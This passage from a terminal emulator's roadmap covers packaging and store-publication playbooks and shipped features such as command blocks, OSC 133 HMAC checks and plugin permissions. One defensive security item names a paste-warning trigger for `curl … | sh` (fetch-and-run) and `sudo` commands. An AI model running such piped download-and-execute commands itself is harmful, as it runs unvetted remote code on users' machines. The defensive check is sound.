# Ants Terminal — Roadmap

> **Current version:** 0.7.16 (2026-04-23) (2026-04-23). See [CHANGELOG.md](CHANGELOG.md)
> for what's shipped; see [PLUGINS.md](PLUGINS.md) for plugin-author
> standards; this document covers what's **planned**.

This roadmap is organized by **target release**, and within each release by
**theme**. Every item has prior art and a one-line implementation note so
it's actionable — not aspirational. Dates are targets, not commitments;
they move based on contributor bandwidth and real-world usage feedback.

**Legend**
- ✅ Done (shipped)
- 🚧 In progress (branch or open PR)
- 📋 Planned (next up for this release)
- 💭 Considered (research phase; may change scope or slip)

**Themes**
- 🎨 **Features** — user-visible capabilities
- ⚡ **Performance** — runtime cost reductions
- 🔌 **Plugins** — extensibility surface
- 🖥 **Platform** — ports (macOS, Windows), Wayland native support, a11y
- 🔒 **Security** — attack-surface reductions
- 🧰 **Dev experience** — tooling, testing, docs
- 📦 **Packaging & distribution** — the work of getting Ants into distros
  as an installable, auditable, default-able terminal. See the
  [distribution-adoption overview](#distribution-adoption-overview) for
  the full multi-release plan.

---

## Distribution-adoption overview

Becoming a distribution's **default** terminal is a long game — every
mainstream default is built by the desktop-environment team itself
(Konsole/KDE, gnome-terminal/GNOME). Outside projects like Ghostty,
WezTerm, Kitty, Alacritty are widely **packaged** but not default
anywhere. Our realistic target is: **get packaged everywhere, accrue
the quality signals distros look for, and let small/niche distros
adopt first.** The work is tracked below under the 📦 theme in each
release; this section is the rollup so nothing falls by the wayside.

| Bundle | What ships | Status | Target release |
|--------|------------|--------|----------------|
| **H1** | `SECURITY.md` coordinated-disclosure policy, `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1) | ✅ | 0.6.16 |
| **H2** | AppStream `org.ants.Terminal.metainfo.xml`, polished desktop entry (`org.ants.Terminal.desktop`), icon install rules | ✅ | 0.6.17 |
| **H3** | Man page `ants-terminal.1` + CMake install rule | ✅ | 0.6.18 |
| **H4** | Bash / zsh / fish completions + CMake install rules | ✅ | 0.6.19 |
| **H5** | openSUSE OBS `.spec`, Arch AUR `PKGBUILD`, Debian `debian/` tree — ready-to-submit packaging files committed to tree | ✅ | 0.6.20 |
| **H6** | Flatpak manifest (`org.ants.Terminal.yml`) + host-shell wiring | ✅ | 0.7.2 |
| **H6.1** | Lua 5.4 module in Flatpak manifest so plugins work inside the sandbox | ✅ | 0.7.3 |
| **H6.2** | Flathub submission — PR `org.ants.Terminal` against `flathub/flathub` | 📋 | 0.8.0 |
| **H7** | Project website + docs site (GitHub Pages) with screenshots, getting-started, plugin authoring | 📋 | 0.8.0 |
| **H8** | macOS port (Qt6 builds cleanly; need `posix_spawn`/`openpty` + NSWindow observer + notarized `.app`) | 📋 | 0.9.0 |
| **H9** | AT-SPI / ATK accessibility — `QAccessibleInterface` for `TerminalWidget`, `text-changed` events batched on OSC 133 D | 📋 | 0.9.0 |
| **H10** | i18n scaffolding — `lupdate`/`linguist` flow, `tr()` on UI strings, `.qm` files for en/es/fr/de | 📋 | 0.9.0 |
| **H11** | Reproducible-build verification + SBOM (`cmake --build` under `SOURCE_DATE_EPOCH`; generate SPDX SBOM) | 💭 | 0.9.0 |
| **H12** | Windows port (ConPTY + Qt6 Windows plugin; sign + MSI) | 💭 | Beyond 1.0 |
| **H13** | Distro-outreach pitch: file "intent-to-package" bugs in Debian / Fedora / NixOS; write launch post for r/linux, Hacker News, Phoronix tip line, LWN | 📋 | 0.8.0 |
| **H14** | Grow bus factor ≥ 2: second maintainer with commit rights, documented governance | 💭 | 1.0.0+ |
| **H15** | FOSDEM lightning talk / devroom slot (Linux desktop devroom is where distro maintainers converge) | 💭 | Beyond 1.0 |
| **H16** | Sponsorship / funding: GitHub Sponsors, Open Collective, or similar | 💭 | Beyond 1.0 |

Already shipped (as of this ROADMAP revision):

- ✅ **`.desktop` file** — pre-0.5 ancestor preserved as
  `ants-terminal.desktop.in` for the dev-symlink workflow; 0.6.17
  adds a spec-compliant `packaging/linux/org.ants.Terminal.desktop`
  for distro installs
- ✅ **Icons at multiple sizes** — `assets/ants-terminal-{16,32,48,64,128,256}.png`,
  installed under `share/icons/hicolor/<size>x<size>/apps/ants-terminal.png`
  by 0.6.17's CMake rules
- ✅ **CHANGELOG.md + SemVer discipline** — every release has a dated section with categorical bullets
- ✅ **CI with ASan + UBSan** — the `build-asan` lane runs sanitized ctest + binary smoke on every push
- ✅ **Audit pipeline** — clazy + cppcheck + grep rules + fixture-enforced regression coverage

Gating items (blocks adoption **today**, not just for being default):

1. **No distro packages anywhere** — H5 + H6 unblock this.
2. ~~**No AppStream metadata** — H2 unblocks GNOME Software / KDE Discover discovery.~~ ✅ Shipped in 0.6.17.
3. ~~**No SECURITY.md** — H1. Distro security teams need a disclosure contact before shipping.~~ ✅ Shipped in 0.6.16.
4. **Linux-only** + ~~**X11-only dropdown**~~ — H8 (macOS) widens the addressable audience; Wayland-native Quake positioning + global-hotkey registration both shipped (0.6.38 + 0.6.39).

---

## Per-store publication playbook

The H-bundle table above tracks **preparation** work (the files that
need to exist in-tree). This section tracks **submission** work —
getting the prepared package actually **live** in each store's
listing. Each store has its own review cadence, ingestion format,
and maintainer expectations, so they're broken out as discrete items
with step-by-step playbooks.

Stores are ordered by **ease of publish × reach**: Flathub + AUR
first (high reach, low friction), official distro archives last
(highest friction, longest lead time). A store is considered
"shipped" when `ants-terminal` installs from the stock package
manager without extra repository configuration.

| Store | Format | Prep status | Publish status | Target release |
|-------|--------|-------------|----------------|----------------|
| **P1 — Flathub** | Flatpak | ✅ manifest + Lua module (H6, H6.1) | 📋 submit `org.ants.Terminal` to `flathub/flathub` (H6.2) | 0.8.0 |
| **P2 — AUR (Arch User Repository)** | PKGBUILD | ✅ recipe (H5) | 📋 push to `aur.archlinux.org/packages/ants-terminal.git` + `-git` variant | 0.8.0 |
| **P3 — openSUSE OBS (home:ants-terminal)** | RPM spec | ✅ spec (H5) | 📋 upload to Open Build Service `home:` project, then target Tumbleweed / Leap repos | 0.8.0 |
| **P4 — Fedora COPR** | RPM spec | ✅ spec (H5) | 📋 create `ants-terminal` COPR; later submit package review for `fedora-extras` | 0.8.0 |
| **P5 — Debian / Ubuntu PPA** | deb source | ✅ debian/ tree (H5) | 📋 upload signed source package to Launchpad PPA | 0.8.0 |
| **P6 — Snap Store (snapcraft.io)** | snapcraft.yaml | 📋 write `snap/snapcraft.yaml`, host-shell model like Flatpak | 📋 register `ants-terminal` snap name + publish via `snapcraft upload` | 0.9.0 |
| **P7 — AppImage** | AppImage | 📋 write `ants-terminal.AppImage.yml` (linuxdeploy / appimage-builder) | 📋 publish nightly + release artifacts on GitHub Releases | 0.9.0 |
| **P8 — Nixpkgs (NixOS)** | nix expression | 📋 write `pkgs/applications/terminal-emulators/ants-terminal/default.nix` | 📋 open PR against `NixOS/nixpkgs` master | 0.9.0 |
| **P9 — Debian (main archive)** | deb, official | 📋 RFP → ITP → sponsored upload → new-queue review | 📋 file ITP bug, find DM sponsor | 1.0.0+ |
| **P10 — Ubuntu (universe, via Debian)** | deb | Auto-sync from Debian unstable | 📋 rides on P9 | 1.0.0+ |
| **P11 — Fedora (official, via Bodhi)** | RPM | 📋 package review bug → sponsor → Bodhi updates | 📋 rides on P4 quality signals | 1.0.0+ |
| **P12 — Arch extra** | PKGBUILD, trusted | Would need TU sponsorship and high AUR install count | 💭 not a goal until reach justifies it | 1.0.0+ |

### P1 — Flathub submission

**Prerequisites:** H6 ✅, H6.1 ✅, H6.2 in-tree prep ✅ (screenshots,
`make-flathub-manifest.sh`, FLATHUB.md playbook).
**Blocker:** real-user shakedown of the 0.7.3 Flatpak before claiming
the Flathub repo name.

1. **Tag the release.** `git tag -s v<version>; git push --tags`.
2. **Regenerate the tag-pinned manifest:**
   `packaging/flatpak/make-flathub-manifest.sh v<version> >
   /tmp/org.ants.Terminal.yml`.
3. **Fork [flathub/flathub](https://github.com/flathub/flathub).**
   In the fork, create a **new repo**
   `flathub/org.ants.Terminal` per the Flathub "Submit via a new
   repo" flow
   (https://docs.flathub.org/docs/for-app-authors/submission/).
4. **Populate the repo** with the generated manifest, a copy of
   `org.ants.Terminal.metainfo.xml` (from `packaging/linux/`), and
   a copy of `org.ants.Terminal.desktop`. Pin `branch: stable` in the
   manifest so Flathub CI builds against our stable branch.
5. **Open a PR** from `flathub/org.ants.Terminal` against
   `flathub/flathub` with the repo URL in the PR body. Flathub CI
   rebuilds on each push.
6. **Respond to review comments** (typical first-review: shrink
   `finish-args` surface, confirm the `flatpak-external-data-checker`
   stanza updates without manual intervention).
7. **On merge,** Flathub publishes automatically. `flatpak install
   flathub org.ants.Terminal` is the smoke test.
8. **Post-merge maintenance:** each new `v<version>` tag requires a
   manifest PR against `flathub/org.ants.Terminal` pointing to the
   new tag (single script invocation — `make-flathub-manifest.sh
   v<new>` → commit → PR). Flathub CI handles the Lua-tarball hash
   refresh on its own via `x-checker-data`.
9. **Flip the gating-item entry:** "No distro packages anywhere" →
   "unblocked via Flathub."

### P2 — AUR publish

**Prerequisites:** H5 ✅ (`packaging/archlinux/PKGBUILD` in tree).
**Blocker:** need an `aur.archlinux.org` maintainer account and an
SSH key registered there.

1. **Create the `ants-terminal` AUR page** via `git clone
   ssh://aur@aur.archlinux.org/ants-terminal.git` (empty repo created
   on first push).
2. **Copy `packaging/archlinux/PKGBUILD`** into the checkout, along
   with a generated `.SRCINFO` (`makepkg --printsrcinfo > .SRCINFO`).
3. **Refresh the tarball hash:** `updpkgsums` resolves the
   `sha256sums=('SKIP')` placeholder against the GitHub tag.
4. **Push** — the AUR git hook publishes immediately. No review
   queue.
5. **Repeat for the `-git` rolling variant:** second repo
   `ants-terminal-git` with the three-line diff documented in
   `packaging/README.md` (`pkgname`, `source`, `pkgver()`).
6. **Maintenance per release:** `updpkgsums && makepkg --printsrcinfo
   > .SRCINFO && git commit && git push`. Script candidate:
   `scripts/publish-aur.sh`.

### P3 — openSUSE Build Service (OBS)

**Prerequisites:** H5 ✅ (`packaging/opensuse/ants-terminal.spec`).
**Blocker:** `openSUSE Build Service` account
(`build.opensuse.org`).

1. **Log in to OBS** and create a `home:<username>:ants-terminal`
   project.
2. **`osc mkpac ants-terminal`** inside the project; drop in
   `ants-terminal.spec`, the source tarball reference, and a
   `.changes` file mirroring CHANGELOG.md in OBS's expected format.
3. **`osc build`** locally against Tumbleweed to catch build
   errors before upload. Then `osc commit`.
4. **OBS auto-builds** against Tumbleweed, Leap 15.x, and any other
   repos added to the project. Results visible at
   `build.opensuse.org/package/show/home:<username>:ants-terminal/ants-terminal`.
5. **Publish to stable repositories:** after green builds, submit a
   `submitrequest` to `devel:languages:misc` (or a dedicated devel
   project). Once accepted, package enters the distro review queue
   for inclusion in the next Tumbleweed / Leap repos.
6. **One-click-install URL:** OBS auto-generates
   `software.opensuse.org/package/ants-terminal` pages for discovery.

### P4 — Fedora COPR

**Prerequisites:** H5 ✅ (spec is Fedora-compatible — uses `%cmake`
macros that work on both Fedora and openSUSE).
**Blocker:** Fedora Account System (FAS) account.

1. **Create a COPR project** at `copr.fedorainfracloud.org/coprs/`
   with Fedora 40/41/42/rawhide chroots enabled.
2. **Upload the spec** via `copr-cli build <project>
   /path/to/ants-terminal.spec` (or sync the GitHub repo with COPR's
   `custom build` webhook for auto-rebuild on tag push).
3. **Smoke-test:** `sudo dnf copr enable <username>/ants-terminal &&
   sudo dnf install ants-terminal`.
4. **Later — submit a package review** against the `Package Reviews`
   Bugzilla product for inclusion in `fedora-extras`. This is the
   start of the Fedora official-archive path (P11).

### P5 — Debian / Ubuntu PPA (Launchpad)

**Prerequisites:** H5 ✅ (`packaging/debian/` tree).
**Blocker:** Launchpad account + a PGP signing key registered there.

1. **Create a PPA** at `launchpad.net/~<user>/+archive/ubuntu/ants-terminal`.
2. **Build a signed source package locally:** `debuild -S -sa` from
   the project root (the debian/ tree is at `packaging/debian/`, so
   symlink or copy it to `./debian/` first).
3. **Upload:** `dput ppa:<user>/ants-terminal
   ../ants-terminal_<version>-1_source.changes`. Launchpad rebuilds
   for each supported Ubuntu series (jammy / noble / oracular).
4. **Smoke-test:** `sudo add-apt-repository ppa:<user>/ants-terminal
   && sudo apt update && sudo apt install ants-terminal`.
5. **Backports note:** Debian users can install the same `.deb`
   directly — Ubuntu PPAs work as a generic Debian-family archive
   when users add the sources.list line manually.

### P6 — Snap Store

**Prerequisites:** write `snap/snapcraft.yaml`, which does NOT
exist yet. Host-shell model similar to our Flatpak approach.

1. **Write `snap/snapcraft.yaml`** targeting `core24`, `confinement:
   strict`, with `plugs:` for `home`, `network`, `wayland`,
   `desktop`, `desktop-legacy`, `opengl`, `pulseaudio`,
   `gsettings`. PTY path mirrors the Flatpak host-shell wiring
   (see `ptyhandler.cpp`'s `FLATPAK_ID` branch — needs a parallel
   `SNAP` branch).
2. **Test locally:** `snapcraft pack` + `sudo snap install
   --dangerous ants-terminal_<version>_amd64.snap`.
3. **Register the name:** `snapcraft register ants-terminal`.
4. **Upload:** `snapcraft upload ants-terminal_<version>_amd64.snap
   --release=stable`. Review by Snap Store is typically hours to
   days on first submission (manual review for `strict`
   confinement + `home` plug), then auto-approved for revisions.
5. **Ongoing:** `snapcraft.io` GitHub builder hooks auto-rebuild
   on tag push — no per-release manual work after the initial
   submission.

### P7 — AppImage

**Prerequisites:** write an AppImage recipe. Not yet started.

1. **Choose tool:** `linuxdeploy` with its Qt plugin is the standard
   for Qt-based AppImages (handles Qt6, QML plugins, platform
   integrations).
2. **Add a CI lane** (`.github/workflows/appimage.yml`) that runs on
   tag push: `make` the project, `linuxdeploy --appdir AppDir
   --plugin qt --output appimage`, attach the resulting
   `Ants_Terminal-<version>-x86_64.AppImage` to the GitHub Release.
3. **(Optional) publish to AppImageHub** (`appimage.github.io`)
   by opening a PR with a YAML metadata stub. AppImageHub is a
   listing directory, not a store — it points at our GitHub
   Release artifact.

### P8 — Nixpkgs

**Prerequisites:** write the nix expression. Not yet started.

1. **Fork `NixOS/nixpkgs`.**
2. **Add `pkgs/applications/terminal-emulators/ants-terminal/default.nix`**
   with `mkDerivation` using `cmake`, `qt6.qtbase`,
   `qt6.qtwayland`, `qt6.qtopengl`, `lua5_4`, etc. Pin
   `src = fetchFromGitHub { … rev = "v<version>"; hash = "sha256-…"; }`.
3. **Wire it in `pkgs/top-level/all-packages.nix`.**
4. **Smoke-test:** `nix-build -A ants-terminal` in the fork.
5. **Open PR** against `NixOS/nixpkgs`. First-submission reviews
   are thorough (style, dependency minimization, `meta` fields);
   budget 1–4 weeks of review cycles.
6. **On merge,** `nix profile install nixpkgs#ants-terminal` works
   for every NixOS + non-NixOS Nix user.

### P9 — Debian (official archive)

**Prerequisites:** P5 working, plus a Debian Developer (DD) sponsor.
Longest lead time of any store.

1. **File an RFP** (Request For Packaging) bug against
   `wnpp` pseudo-package in Debian BTS.
2. **Work with a sponsor** (DD or DM) to iteratively polish the
   packaging (lintian clean, copyright audit, build on buildd
   network). Our `packaging/debian/` tree is a starting point —
   expect several rounds of refinement.
3. **ITP** (Intent To Package): once polished, the sponsor files
   an ITP bug and uploads the source package via their credentials.
4. **New-queue review:** ftpmaster manually reviews the initial
   upload for license + standards compliance. First-time uploads
   can sit in new-queue for weeks.
5. **After acceptance:** subsequent versions go through normal
   sponsor-upload flow (still requires DD involvement) until I apply
   for DM status (2-year typical timeline).

### P10 — Ubuntu (via Debian)

Rides on P9. Debian unstable auto-syncs to the next Ubuntu dev
release; Ubuntu-specific patches generally aren't needed for a
terminal emulator.

### P11 — Fedora (official archive)

Rides on P4 track record. Submit package review against
`fedora-extras`; once approved, package lands in Fedora rawhide and
follows normal Bodhi update flow into stable releases.

### P12 — Arch extra

Requires Arch Trusted User (TU) sponsorship. Not a near-term goal;
AUR (P2) is the standard Arch path and serves the Arch community
adequately.

---

## Table of Contents

1. [Distribution-adoption overview](#distribution-adoption-overview)
2. [0.5.0 — shipped](#050--shipped-2026-04-13)
3. [0.6.0 — shipped](#060--shipped-2026-04-14)
4. [0.7.0 — shell integration + triggers](#070--shell-integration--triggers-target-2026-06)
5. [0.7.12 — independent-review sweep](#0712--independent-review-sweep-target-2026-05)
6. [0.8.0 — multiplexing + marketplace](#080--multiplexing--marketplace-target-2026-08)
7. [0.9.0 — platform + a11y](#090--platform--a11y-target-2026-10)
8. [1.0.0 — stability milestone](#100--stability-milestone-target-2026-12)
9. [Beyond 1.0 — long-horizon](#beyond-10--long-horizon)
10. [How to propose a roadmap item](#how-to-propose-a-roadmap-item)

---

## 0.5.0 — shipped (2026-04-13)

Reference point — see [CHANGELOG.md](CHANGELOG.md#050--2026-04-13) for the
full list. Headline: **context-aware Project Audit** (inline suppressions,
generated-file skip, path rules, code snippets, git blame enrichment,
confidence score 0–100, Semgrep integration, AI triage per finding,
version stamping on every export).

---

## 0.6.0 — shipped (2026-04-14)

**Theme of the release:** make the two features that already make Ants
distinctive (plugins + audit) production-grade. No sprawl; polish what's
there before adding a multiplexer. Reference:
[CHANGELOG.md §0.6.0](CHANGELOG.md#060--2026-04-14).

### 🎨 Features

- ✅ **Scrollback regex search**. `Ctrl+Shift+F` floating bar with
  three toggles — `.*` (regex), `Aa` (case), `Ab` (whole word,
  Alt+R/C/W) — plus match counter, next/prev jump, all-match
  highlight overlay, current-match accent, invalid-pattern feedback.
  Ghostty 1.3 parity.
- ✅ **OSC 9;4 progress reporting**. Parses
  `ESC ] 9 ; 4 ; state ; pct ST` (ConEmu / Microsoft Terminal), renders
  a thin colored strip along the bottom edge plus a tab-icon dot.
- ✅ **Click-to-move-cursor on shell prompts** (previously in code;
  docs promoted).
- 💭 **Kitty Unicode-placeholder graphics** (U+10EEEE + diacritics).
  Moved to 0.7 backlog — scope-wise a standalone item, not a blocker.

### 🔌 Plugins — manifest v2 + capability model

- ✅ **Declarative permissions in `manifest.json`** — `permissions`
  array with first-load confirmation dialog, persisted per-plugin grants
  in `config.json` (`plugin_grants`). Un-granted permissions = missing
  API functions (not `nil` stubs) so plugins can feature-detect.
- ✅ **Per-plugin Lua VMs** — each plugin gets its own `lua_State`,
  10 MB heap budget, 10 M instruction hook. `PluginManager` fans
  events out over all loaded VMs.
- ✅ **`ants.settings.get / .set`** — gated by `"settings"`. Backed by
  `config.json`'s `plugin_settings.<name>.<key>`. Settings-dialog
  auto-render of `"settings_schema"` is follow-up (API + store in
  place).
- ✅ **`ants.clipboard.write(text)`** — gated by `"clipboard.write"`.
- ✅ **Hot reload** via `QFileSystemWatcher` on `init.lua` /
  `manifest.json` / plugin dir. Fires `load` / `unload` lifecycle
  events. Enabled only when `ANTS_PLUGIN_DEV=1`.
- ✅ **Plugin keybindings** — `manifest.json` `"keybindings":
  {"action-id": "Ctrl+Shift+X"}` block. Firing the shortcut sends a
  `keybinding` event to the owning plugin.
- ✅ **`ants._version`** + **`ants._plugin_name`** exposed.

### ⚡ Performance

- ✅ **LRU glyph-atlas eviction**. Per-glyph `lastFrame` counter,
  warm-half retention on overflow, median-based fallback. See
  `glrenderer.cpp:compactAtlas`.
- ✅ **Per-line dirty tracking** (partial). `TermLine::dirty` set by
  grid mutations; `TerminalWidget::invalidateSpanCaches()` does
  targeted eviction of URL / highlight caches. Full cell-level
  render-path partial-update remains as future work — primitive is in
  place.
- 💭 **EGL_EXT_swap_buffers_with_damage + EGL_EXT_buffer_age** on the GL
  path. Deferred — narrow Mesa-only win, revisit in 0.9 platform pass.

### 🔒 Security

- ✅ **Multi-line paste confirmation**. Dialog on `\n` / `sudo ` /
  `curl … | sh` / control chars. Policy independent of bracketed-paste
  mode. Config key `confirm_multiline_paste` (default on).
- ✅ **Per-terminal OSC 52 write quota**: 32 writes/min + 1 MB/min
  (independent of the 1 MB per-string cap).
- ✅ **OSC 8 homograph warning**: when visible label's hostname ≠
  URL host, a confirm dialog shows both and requires opt-in.

### 🧰 Dev experience

- ✅ **`ants-terminal --new-plugin <name>`** — scaffolds init.lua /
  manifest.json / README.md from templates. Name validated against
  `[A-Za-z][A-Za-z0-9_-]{0,63}`.
- ✅ **`ANTS_PLUGIN_DEV=1`** — verbose logging on plugin scan/load,
  plus hot reload.
- ✅ **`--help` / `--version`** CLI flags wired via
  `QCommandLineParser`.

---

## 0.7.0 — shell integration + triggers (target: 2026-06)

**Theme:** make Ants the best terminal for **shell-aware workflows**.

### 🎨 Features — shell integration beyond OSC 133

- ✅ **Command blocks as first-class UI** (Warp parity,
  [docs](https://docs.warp.dev/terminal/blocks)). Shipped across
  several releases and consolidated in 0.6.10. Prompt → command →
  output grouping via `OSC 133` markers, `Ctrl+Shift+Up` /
  `Ctrl+Shift+Down` jump-to-prev/next prompt, collapsible output with
  "… N lines hidden" summary bar, duration + timestamp in the prompt
  gutter, 2px pass/fail status stripe, and per-block right-click
  menu: Copy Command, Copy Output, Re-run Command, Fold/Unfold,
  Share Block as `.cast`. "Suppress output noise" is deferred — the
  original sub-bullet didn't define a noise heuristic and wasn't
  worth blocking the bundle. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Asciinema recording** (`.cast` v2 format,
  [spec](https://docs.asciinema.org/manual/asciicast/v2/)). Shipped.
  Full-session recording via `Settings → Record Session` (default
  `Ctrl+Shift+R`); per-block export via the command-block context
  menu in 0.6.10. Asciicast v2 header + event-stream format. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Semantic history**. Shipped in 0.6.x and broadened in 0.6.12.
  Ctrl-click on a `path:line:col` capture in scrollback (compiler /
  linter / stack-trace output) opens the file at the cited line/col
  via `TerminalWidget::openFileAtPath()`. Detection lives in
  `detectUrls()` (regex captures `path:line[:col]`); CWD resolution
  uses `/proc/<pid>/cwd` so relative paths Just Work without shell
  cooperation. 0.6.12 broadened the editor switch from VS Code + Kate
  only to also cover the VS Code family (`code-insiders`, `codium`),
  vi-family (`nvim`, `vim`), `nano`, Sublime / Helix / Micro
  (`path:line:col` argv shape), and JetBrains IDEs (`--line N
  --column M`). See
  [CHANGELOG.md §0.6.12](CHANGELOG.md#0612--2026-04-14).
- ✅ **Shell-side HMAC verification** for OSC 133 markers. Shipped in
  0.6.31. When `$ANTS_OSC133_KEY` is set in the terminal's environment,
  every OSC 133 marker (`A`/`B`/`C`/`D`) must carry an `ahmac=` param
  computed as HMAC-SHA256(key, `<marker>|<promptId>[|<exitCode>]`).
  Markers without a valid HMAC are dropped and a forgery counter
  increments, surfaced as a status-bar warning with a 5-second
  cooldown. Bash + zsh hook scripts ship under
  `packaging/shell-integration/`. Headless feature test
  (`tests/features/osc133_hmac_verification/`) covers verifier OFF
  back-compatibility, verifier ON accept of valid HMACs (including
  uppercase-hex), and rejection of missing/wrong/promptId-mismatched/
  exit-code-mismatched HMACs. See
  [CHANGELOG.md §0.6.31](CHANGELOG.md#0631--2026-04-17).

### 🔌 Plugins — trigger system

- ✅ **Trigger rules** with `instant` flag and the full iTerm2 action
  set — `bell`, `inject`, `run_script`, `notify`, `sound`, `command`
  shipped in 0.6.9; the three deferred grid-mutation actions
  `highlight_line`, `highlight_text`, and `make_hyperlink` shipped in
  0.6.13 via a new `TerminalGrid` line-completion callback so matches
  map to exact col ranges on a real row before the row scrolls into
  scrollback. Full parity with the iTerm2 trigger doc. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14) and
  [CHANGELOG.md §0.6.13](CHANGELOG.md#0613--2026-04-14).
- ✅ **User-vars channel**: OSC 1337 SetUserVar parsing + the
  `user_var_changed` event. Shipped in 0.6.9. Disambiguated from
  inline images by the byte after `1337;`. NAME ≤ 128 chars; decoded
  value capped at 4 KiB. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ **Command-palette registration**: `ants.palette.register({title,
  action, hotkey})` shipped in 0.6.9. Always-on (no permission gate),
  optional global QShortcut. Entry triggers fire scoped
  `palette_action` event. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ Events: `command_finished` (exit + duration), `pane_focused`,
  `theme_changed`, `window_config_reloaded`, `user_var_changed`,
  `palette_action`. All shipped in 0.6.9. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).

### ⚡ Performance

- ✅ **SIMD VT-parser scan**. Shipped in 0.6.23. Ground-state hot path
  now scans 16 bytes at a time via SSE2 (x86_64) / NEON (ARM64) for
  the next non-printable-ASCII byte, then bulk-emits `Print` actions
  for the safe run without running the full state machine. A signed-
  compare trick (XOR 0x80 → two `cmpgt_epi8` against pre-computed
  bounds) flags any interesting byte with one `movemask`. Regression
  guard: `tests/features/vtparser_simd_scan/` asserts byte-identical
  action streams across whole-buffer, byte-by-byte, and pseudo-random-
  chunk feeds over a 38-case corpus covering every offset-mod-16
  alignment for the scan boundary. See
  [CHANGELOG.md §0.6.23](CHANGELOG.md#0623--2026-04-15).
- ✅ **Decouple read/parse/render thread**. Shipped in 0.6.34. PTY read
  and VT parse now run on a dedicated worker QThread (`VtStream`);
  parsed `VtAction` batches are shipped to the GUI over a
  `Qt::QueuedConnection` and applied to `TerminalGrid` there, so paint
  stays on the main thread. Back-pressure: at most 8 batches in flight
  (≈128 KB of unprocessed PTY bytes) before the worker disables its
  `QSocketNotifier` and lets the kernel apply flow control to the
  child; GUI re-enables on drain. PTY writes (keystrokes, DA/CPR/OSC 52
  responses) cross back to the worker via
  `QMetaObject::invokeMethod(... Qt::QueuedConnection)`. Resize goes
  through `Qt::BlockingQueuedConnection` so the PTY winsize is updated
  before the next paint. The `ANTS_SINGLE_THREADED=1` kill-switch was
  retired in 0.6.37 once the new path proved out in the wild (0.6.34
  → 0.6.37 bake period) and the legacy single-threaded code paths were
  deleted. Four feature tests lock the invariants: parse equivalence
  across 11 fixtures × 6 chunking strategies, response ordering, the
  source-level resize-synchronicity contract, and the ptyWrite-gating
  regression pin. See
  [CHANGELOG.md §0.6.34](CHANGELOG.md#0634--2026-04-18) and
  [§0.6.37](CHANGELOG.md#0637--2026-04-18).
- ✅ **Incremental reflow on resize**. Shipped in 0.6.15. The original
  research note called for tracking `wrap_col` per line; the actual
  implementation works on equivalent information already on the line
  (`softWrapped` flag + a single-pass content-width check): standalone
  lines that fit the new width get an in-place `cells.resize()` with
  default-attr padding or trailing-blank trim, skipping the
  allocation-heavy `joinLogical` / `rewrap` round-trip. Multi-line
  soft-wrap sequences still go through the full logic so correctness
  is preserved. See
  [CHANGELOG.md §0.6.15](CHANGELOG.md#0615--2026-04-14).

### 🖥 Platform

- ✅ **Wayland-native Quake-mode** — shipped across two releases.
  Part 1 of 2 (0.6.38): `find_package(LayerShellQt CONFIG QUIET)` wires
  `LayerShellQt::Interface` when the `layer-shell-qt6-devel` package
  is installed, and `MainWindow::setupQuakeMode()` promotes the window
  to a `zwlr_layer_surface_v1` at `LayerTop`, anchored top/left/right
  with exclusive-zone 0. The dead `quake_hotkey` config key is wired
  to a `QShortcut` with `Qt::ApplicationShortcut` context. XCB path
  preserved for X11. Source-level invariants pinned in
  `tests/features/wayland_quake_mode/`.
  Part 2 of 2 (0.6.39): `GlobalShortcutsPortal` client wraps the
  Freedesktop `org.freedesktop.portal.GlobalShortcuts` handshake
  (CreateSession → session handle → BindShortcuts → Activated) behind
  a single Qt signal. `MainWindow` binds the `toggle-quake` id when
  the portal service is registered on the session bus (KDE Plasma 6,
  xdg-desktop-portal-hyprland, -wlr); on GNOME Shell the portal call
  fails and the in-app `QShortcut` fallback stays as the activation
  path. Both paths debounce via a 500 ms window to avoid focused
  double-fire. Replaces the originally-planned KGlobalAccel + GNOME
  D-Bus branching with one compositor-agnostic API. See
  [CHANGELOG.md §0.6.38](CHANGELOG.md#0638--2026-04-18) and
  [§0.6.39](CHANGELOG.md#0639--2026-04-18).

### 🔒 Security

- ✅ **Plugin capability audit UI**. Shipped in 0.6.11. Settings →
  **Plugins** lists every discovered plugin and renders each declared
  permission as a checkbox — checked = granted, unchecked = revoked.
  Revocations persist to `config.plugin_grants[<name>]` and take
  effect at next plugin reload (matches the first-load permission
  prompt's grant semantics). See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).
- ✅ **Image-bomb defenses**. Shipped in 0.6.11. New
  `TerminalGrid::ImageBudget` tracks total decoded image bytes
  across the inline-display vector + the Kitty cache; cap is **256 MB
  per terminal**. Sixel rejects up front from declared raster size;
  Kitty PNG / iTerm2 OSC 1337 reject post-decode. Inline red error
  text surfaces the rejection (no desktop notification). Per-image
  dimension cap (`MAX_IMAGE_DIM = 4096`) was already in place and
  remains stricter than the 16384 the original ROADMAP item called
  for. See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).

### 📦 Distribution readiness (H1–H4)

Near-term packaging-polish work — all fully additive, zero C++ code
changes, no new runtime dependencies. Together these four bundles
take Ants from "side project on GitHub" to "package a distro
maintainer could pick up tomorrow." See the
[distribution-adoption overview](#distribution-adoption-overview)
for the full multi-release plan.

- ✅ **H1 — `SECURITY.md` + `CODE_OF_CONDUCT.md`**. Shipped in 0.6.16.
  Coordinated-disclosure policy with supported-versions table,
  reporting channel (GitHub Security Advisory + encrypted email),
  disclosure timeline, severity rubric, in/out of scope lists, and an
  acknowledgement of the hardening we already do. Contributor Covenant
  2.1 verbatim with a dedicated maintainer email + the private GitHub
  Security Advisory listed as conduct reporting channels. Clears the
  Debian / Fedora / Ubuntu security-team review gate. See
  [CHANGELOG.md §0.6.16](CHANGELOG.md#0616--2026-04-14).
- ✅ **H2 — AppStream metainfo + polished desktop entry**. Shipped in
  0.6.17. `packaging/linux/org.ants.Terminal.metainfo.xml` (AppStream
  1.0 with summary / description / releases / categories / keywords /
  OARS content rating / supports / provides / launchable) and
  `packaging/linux/org.ants.Terminal.desktop` (reverse-DNS id,
